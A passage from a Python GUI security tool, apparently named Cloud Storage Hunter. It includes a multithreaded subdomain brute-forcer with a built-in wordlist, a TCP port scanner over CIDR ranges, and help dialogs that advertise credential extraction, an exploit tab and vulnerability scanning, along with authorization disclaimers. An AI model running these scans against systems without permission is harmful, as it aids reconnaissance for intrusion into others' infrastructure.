        status_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=status_var, foreground=self.colors['accent']).pack(pady=5)
        
        results_text = scrolledtext.ScrolledText(win, height=18, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def scan_subdomains():
            domain = domain_var.get().strip()
            if not domain:
                messagebox.showwarning("Warning", "Enter a domain!")
                return
            
            # Load subdomains
            subdomains = []
            
            # Default common subdomains
            common = [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
                'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'ns',
                'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 'mail2',
                'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static', 'docs',
                'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki', 'web', 'media',
                'email', 'images', 'img', 'download', 'dns', 'stats', 'dashboard', 'portal', 'manage',
                'api', 'app', 'apps', 'auth', 'login', 'signin', 'signup', 'account', 'user', 'admin'
            ]
            subdomains.extend(common)
            
            # Load custom wordlist
            if wordlist_var.get() and os.path.exists(wordlist_var.get()):
                with open(wordlist_var.get(), 'r') as f:
                    for line in f:
                        word = line.strip()
                        if word:
                            subdomains.append(word)
            
            subdomains = list(set(subdomains))
            
            progress.start()
            status_var.set(f"Scanning {len(subdomains)} subdomains...")
            results_text.delete(1.0, tk.END)
            results_text.insert(tk.END, f"🔍 Scanning subdomains for: {domain}\n")
            results_text.insert(tk.END, f"Total: {len(subdomains)} subdomains\n")
            results_text.insert(tk.END, "=" * 50 + "\n\n")
            
            found = []
            
            def check_subdomain(sub):
                hostname = f"{sub}.{domain}"
                try:
                    ip = socket.gethostbyname(hostname)
                    return (hostname, ip)
                except:
                    return None
            
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(check_subdomain, sub) for sub in subdomains]
                for i, future in enumerate(as_completed(futures)):
                    result = future.result()
                    if result:
                        hostname, ip = result
                        found.append(result)
                        results_text.insert(tk.END, f"✅ {hostname} → {ip}\n")
                        results_text.see(tk.END)
                    status_var.set(f"Progress: {i+1}/{len(subdomains)} | Found: {len(found)}")
                    win.update()
            
            progress.stop()
            results_text.insert(tk.END, f"\n{'='*50}\n")
            results_text.insert(tk.END, f"✅ Scan complete! Found {len(found)} subdomains.\n")
            status_var.set(f"Complete - Found {len(found)} subdomains")
            messagebox.showinfo("Scan Complete", f"Found {len(found)} subdomains for {domain}")
        
        ttk.Button(win, text="Start Scan", command=scan_subdomains, style='Primary.TButton').pack(pady=10)
    
    def open_network_scanner(self):
        """Open network scanner tool"""
        win = tk.Toplevel(self.root)
        win.title("Network Scanner")
        win.geometry("900x700")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Network Scanner", style='Title.TLabel').pack(pady=10)
        
        # Target
        target_frame = ttk.Frame(win)
        target_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(target_frame, text="Network (CIDR):", style='Heading.TLabel').pack(side=tk.LEFT, padx=5)
        network_var = tk.StringVar(value="192.168.1.0/24")
        ttk.Entry(target_frame, textvariable=network_var, width=30, font=('Consolas', 11)).pack(side=tk.LEFT, padx=5)
        
        ttk.Label(target_frame, text="Ports:", style='Heading.TLabel').pack(side=tk.LEFT, padx=20)
        ports_var = tk.StringVar(value="22,80,443,8080")
        ttk.Entry(target_frame, textvariable=ports_var, width=20, font=('Consolas', 11)).pack(side=tk.LEFT, padx=5)
        
        progress = ttk.Progressbar(win, mode='indeterminate', style='Accent.Horizontal.TProgressbar')
        progress.pack(fill=tk.X, padx=10, pady=10)
        
        status_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=status_var, foreground=self.colors['accent']).pack(pady=5)
        
        results_text = scrolledtext.ScrolledText(win, height=18, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def scan_network():
            network = network_var.get().strip()
            ports_str = ports_var.get().strip()
            
            if not network:
                messagebox.showwarning("Warning", "Enter a network!")
                return
            
            # Parse ports
            ports = []
            if ',' in ports_str:
                ports = [int(p.strip()) for p in ports_str.split(',')]
            else:
                ports = [int(ports_str)]
            
            # Parse network
            try:
                import ipaddress
                net = ipaddress.ip_network(network, strict=False)
                hosts = list(net.hosts())
            except Exception as e:
                messagebox.showerror("Error", f"Invalid network: {e}")
                return
            
            results_text.delete(1.0, tk.END)
            results_text.insert(tk.END, f"🔍 Scanning network: {network}\n")
            results_text.insert(tk.END, f"Hosts: {len(hosts)}\n")
            results_text.insert(tk.END, f"Ports: {ports}\n")
            results_text.insert(tk.END, "=" * 50 + "\n\n")
            
            progress['maximum'] = len(hosts) * len(ports)
            progress['value'] = 0
            
            found_hosts = []
            scanned = 0
            
            def scan_host(ip, port):
                nonlocal scanned
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((str(ip), port))
                    sock.close()
                    scanned += 1
                    progress['value'] = scanned
                    if result == 0:
                        return (str(ip), port)
                except:
                    pass
                return None
            
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = []
                for ip in hosts:
                    for port in ports:
                        futures.append(executor.submit(scan_host, ip, port))
                
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        ip, port = result
                        found_hosts.append(result)
                        results_text.insert(tk.END, f"✅ {ip}:{port} - OPEN\n")
                        results_text.see(tk.END)
                    status_var.set(f"Scanned: {scanned}/{len(hosts)*len(ports)} | Found: {len(found_hosts)}")
                    win.update()
            
            progress['value'] = 0
            results_text.insert(tk.END, f"\n{'='*50}\n")
            results_text.insert(tk.END, f"✅ Scan complete! Found {len(found_hosts)} open ports.\n")
            status_var.set(f"Complete - Found {len(found_hosts)} open ports")
            messagebox.showinfo("Scan Complete", f"Found {len(found_hosts)} open ports")
        
        ttk.Button(win, text="Start Scan", command=scan_network, style='Primary.TButton').pack(pady=10)
    
    # ========================================================================
    # UTILITY METHODS
    # ========================================================================
    
    def format_size(self, size: int) -> str:
        """Format file size with appropriate unit"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB', 'PB']:
            if size < 1024.0:
                return f"{size:.1f} {unit}"
            size /= 1024.0
        return f"{size:.1f} PB"
    
    def get_file_icon(self, filename: str) -> str:
        """Get appropriate icon for file type"""
        ext = os.path.splitext(filename)[1].lower()
        icons = {
            '.html': '🌐', '.htm': '🌐', '.js': '📜', '.css': '🎨',
            '.json': '📋', '.xml': '📋', '.txt': '📄', '.md': '📝',
            '.py': '🐍', '.php': '🐘', '.jpg': '🖼️', '.jpeg': '🖼️',
            '.png': '🖼️', '.gif': '🖼️', '.svg': '🖼️', '.pdf': '📕',
            '.zip': '📦', '.tar': '📦', '.gz': '📦', '.exe': '⚙️',
            '.dll': '🔧', '.conf': '⚙️', '.log': '📋', '.key': '🔑',
            '.pem': '🔑', '.env': '🔐', '.sql': '🗄️', '.db': '🗄️',
            '.mp3': '🎵', '.mp4': '🎬', '.avi': '🎬', '.mov': '🎬'
        }
        return icons.get(ext, '📄')
    
    def copy_to_clipboard(self, text: str):
        """Copy text to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        self.log(f"Copied to clipboard: {text[:50]}...")
    
    def log(self, message: str):
        """Log message to console and activity"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_msg = f"[{timestamp}] {message}\n"

        # Update activity text safely (thread-safe via after)
        if hasattr(self, 'activity_text'):
            try:
                self.root.after(0, lambda: (self.activity_text.insert(tk.END, log_msg), self.activity_text.see(tk.END)))
            except:
                pass

        # Update status safely
        if hasattr(self, 'status_label'):
            try:
                self.root.after(0, lambda: self.status_label.config(text=message[:100]))
            except:
                pass

        # Print to console
        print(log_msg.strip())

        # Save to log file
        try:
            with open(os.path.join(self.settings['results_dir'], 'activity.log'), 'a', encoding='utf-8') as f:
                f.write(log_msg)
        except:
            pass
    
    # ========================================================================
    # DOCUMENTATION & HELP
    # ========================================================================
    
    def open_docs(self):
        """Open documentation window"""
        win = tk.Toplevel(self.root)
        win.title(f"{self.APP_NAME} - Documentation")
        win.geometry("900x700")
        win.configure(bg='#0a0a0a')
        
        docs_text = scrolledtext.ScrolledText(win, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 10))
        docs_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        docs = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    {self.APP_NAME} v{self.VERSION} - DOCUMENTATION                       ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  OVERVIEW                                                                     ║
║  ════════                                                                     ║
║  {self.APP_NAME} is a professional security assessment tool designed to help   ║
║  security professionals identify misconfigured cloud storage buckets and      ║
║  potential security vulnerabilities.                                         ║
║                                                                               ║
║  FEATURES                                                                     ║
║  ════════                                                                     ║
║  • Multi-provider support (AWS S3, Google GCS, Azure Blob, and more)         ║
║  • Full file management with editing capabilities                            ║
║  • Automated credential detection and extraction                             ║
║  • Vulnerability scanning (XSS, SQLi, LFI, RCE, SSRF)                        ║
║  • Comprehensive reporting (HTML, PDF, JSON, CSV)                            ║
║  • Built-in security tools (hash generation, encoding, network scanning)     ║
║  • Professional dashboard with statistics                                    ║
║                                                                               ║
║  SUPPORTED PROVIDERS                                                          ║
║  ═══════════════════                                                          ║
║  • AWS S3 (Amazon Web Services)                                              ║
║  • Google GCS (Google Cloud Storage)                                         ║
║  • Azure Blob Storage                                                        ║
║  • Wasabi                                                                    ║
║  • DigitalOcean Spaces                                                       ║
║  • Backblaze B2                                                              ║
║  • Linode Object Storage                                                     ║
║  • Vultr Object Storage                                                      ║
║  • Alibaba Cloud OSS                                                         ║
║  • Tencent Cloud COS                                                         ║
║                                                                               ║
║  HOW TO USE                                                                   ║
║  ═══════════                                                                  ║
║  1. Dashboard: View statistics and quick actions                             ║
║  2. File Manager: Browse and manage bucket files                             ║
║  3. Bucket Browser: Explore bucket contents                                  ║
║  4. Scan: Configure and run security scans                                   ║
║  5. Exploit: Test for vulnerabilities                                        ║
║  6. Results: View discovered buckets                                         ║
║  7. Credentials: Review found credentials                                    ║
║  8. Vulnerabilities: Track security issues                                   ║
║  9. Tools: Access built-in utilities                                         ║
║  10. Reports: Generate professional reports                                  ║
║  11. History: View past scan sessions                                        ║
║  12. Settings: Configure application options                                 ║
║                                                                               ║
║  KEYBOARD SHORTCUTS                                                           ║
║  ═══════════════════                                                          ║
║  Ctrl+S    - Save session                                                    ║
║  Ctrl+O    - Load session                                                    ║
║  Ctrl+Q    - Quit application                                                ║
║  Ctrl+,    - Open settings                                                   ║
║  F1        - Open documentation                                              ║
║  F2        - Quick scan                                                      ║
║  F3        - Full scan                                                       ║
║  F4        - Open File Manager                                               ║
║  F5        - Refresh current view                                            ║
║  Ctrl+Tab  - Next tab                                                        ║
║  Ctrl+Shift+Tab - Previous tab                                               ║
║  Alt+1-9   - Switch to tab                                                   ║
║                                                                               ║
║  TIPS & BEST PRACTICES                                                        ║
║  ═══════════════════════                                                     ║
║  • Always obtain proper authorization before scanning                        ║
║  • Use the Batch Scanner for multiple targets                                ║
║  • Enable deep scan for thorough analysis                                    ║
║  • Save sessions regularly to preserve findings                              ║
║  • Generate reports for documentation                                        ║
║  • Use custom wordlists for better coverage                                  ║
║  • Check the Vulnerabilities tab for security issues                         ║
║  • Review Credentials tab for exposed secrets                                ║
║                                                                               ║
║  DISCLAIMER                                                                   ║
║  ═══════════                                                                  ║
║  This tool is for educational and authorized security testing purposes only. ║
║  Always ensure you have written permission before scanning or accessing      ║
║  any cloud storage resources. Unauthorized access is illegal and may         ║
║  result in severe penalties. The author assumes no liability for misuse.     ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
        docs_text.insert(1.0, docs)
        docs_text.config(state=tk.DISABLED)
    
    def show_shortcuts(self):
        """Show keyboard shortcuts"""
        shortcuts = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         KEYBOARD SHORTCUTS                                     ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  GLOBAL SHORTCUTS:                                                            ║
║  ═════════════════                                                            ║
║  Ctrl+S    - Save current session                                            ║
║  Ctrl+O    - Load session from file                                           ║
║  Ctrl+Q    - Exit application                                                 ║
║  Ctrl+,    - Open settings                                                    ║
║  F1        - Open documentation                                               ║
║  F5        - Refresh current view                                             ║
║                                                                               ║
║  SCAN SHORTCUTS:                                                              ║
║  ══════════════                                                               ║
║  F2        - Start quick scan                                                 ║
║  F3        - Start full scan                                                  ║
║  F4        - Open File Manager                                                ║
║                                                                               ║
║  TAB NAVIGATION:                                                              ║
║  ═══════════════                                                              ║
║  Ctrl+Tab          - Next tab                                                 ║
║  Ctrl+Shift+Tab    - Previous tab                                             ║
║  Alt+1             - Dashboard                                                ║
║  Alt+2             - File Manager                                             ║
║  Alt+3             - Bucket Browser                                           ║
║  Alt+4             - Scan                                                     ║
║  Alt+5             - Exploit                                                  ║
║  Alt+6             - Results                                                  ║
║  Alt+7             - Credentials                                              ║
║  Alt+8             - Vulnerabilities                                          ║
║  Alt+9             - Tools                                                    ║
║                                                                               ║
║  FILE MANAGER SHORTCUTS:                                                      ║
║  ═══════════════════════                                                     ║
║  Double-click file - Edit file                                                ║
║  Right-click file  - Context menu                                             ║
║  Ctrl+F            - Find in file                                             ║
║  Ctrl+R            - Replace in file                                          ║
║  Ctrl+S            - Save file                                                ║
║  Delete            - Delete selected file                                     ║
║                                                                               ║
║  RESULTS & CREDENTIALS:                                                       ║
║  ═══════════════════════════                                                 ║
║  Double-click row   - Open bucket/file                                        ║
║  Right-click row    - Context menu                                            ║
║  Ctrl+C             - Copy selected                                           ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
        messagebox.showinfo("Keyboard Shortcuts", shortcuts)
    
    def show_about(self):
        """Show about dialog"""
        about = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║                    {self.APP_NAME} v{self.VERSION}                                      ║
║                    Professional Cloud Storage Security Tool                   ║
║                                                                               ║
║  ┌─────────────────────────────────────────────────────────────────────────┐ ║
║  │                         FEATURES                                         │ ║
║  ├─────────────────────────────────────────────────────────────────────────┤ ║
║  │  • Multi-Provider Support (10+ providers)                               │ ║
║  │  • Full File Management with Editor                                     │ ║
║  │  • Automated Credential Detection                                       │ ║
║  │  • Vulnerability Scanning (XSS, SQLi, LFI, RCE, SSRF)                   │ ║
║  │  • Professional Reporting (HTML, PDF, JSON, CSV)                        │ ║
║  │  • Built-in Security Tools                                              │ ║
║  │  • Multi-threaded Scanning                                              │ ║
║  │  • Session Management                                                   │ ║
║  └─────────────────────────────────────────────────────────────────────────┘ ║
║                                                                               ║
║  Author: Security Research Team                                              ║
║  Build Date: {self.BUILD_DATE}                                                      ║
║                                                                               ║
║  ⚠️  DISCLAIMER                                                              ║
║  This tool is for authorized security testing only.                          ║
║  Unauthorized access to cloud storage is illegal.                            ║
║                                                                               ║
║  © {datetime.now().year} {self.APP_NAME} - All Rights Reserved                     ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
        messagebox.showinfo(f"About {self.APP_NAME}", about)
    
    def show_license(self):
        """Show license information"""
        license_text = """
SOFTWARE LICENSE AGREEMENT
==========================

Copyright (c) 2024 Cloud Storage Hunter

Permission is hereby granted to authorized security professionals for the sole
purpose of conducting security assessments on systems they own or have explicit
written permission to test.

RESTRICTIONS:
- You may NOT use this software for illegal purposes
- You may NOT scan systems without authorization
- You may NOT modify and redistribute as your own
- You may NOT remove copyright notices

LIABILITY:
This software is provided "AS IS" without warranty of any kind. The authors
are not responsible for any damage caused by the use or misuse of this software.

COMPLIANCE:
Users must comply with all applicable laws and regulations including but not
limited to:
- Computer Fraud and Abuse Act (CFAA)
- GDPR, HIPAA, PCI-DSS where applicable
- Cloud provider terms of service

By using this software, you acknowledge that you have read this agreement,
understand it, and agree to be bound by its terms.

For authorized use only.
"""
        messagebox.showinfo("License", license_text)
    
    def report_bug(self):
        """Report a bug"""
        messagebox.showinfo("Report Bug", "Please report bugs to: security@example.com\n\nInclude:\n- Version number\n- Steps to reproduce\n- Error messages\n- Screenshots if applicable")
    
    def request_feature(self):
        """Request a feature"""
        messagebox.showinfo("Request Feature", "Feature requests can be submitted to: features@example.com\n\nPlease include:\n- Feature description\n- Use case\n- Priority level")


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """Main entry point"""
    root = tk.Tk()
    
    # Set icon if available
    try:
        root.iconbitmap(default='icon.ico')
    except:
        pass
    
    # Create application
    app = CloudStorageHunter(root)
    
    # Run main loop
    root.mainloop()


if __name__ == "__main__":
    main()    